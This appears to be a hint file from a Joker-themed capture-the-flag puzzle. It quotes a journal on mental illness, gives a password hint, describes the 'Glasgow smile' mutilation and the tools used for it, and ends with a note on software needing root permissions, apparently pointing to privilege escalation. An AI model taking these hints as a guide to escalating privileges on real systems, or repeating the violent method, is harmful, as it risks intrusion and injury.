Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition\. This relates to his feeling about being ignored\. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't\."
Now I need your help Abner, use this password, you will find the right way to solve the enigma\.

A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile\.
The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly\.
The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s\. The attack became popular with English street gangs \(especially among the Chelsea Headhunters, a London\-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile"\)\.

I'm writing software, I can't make it work because of a permissions issue\. It only runs with root permissions\. When it's complete I'll copy it to this folder\.
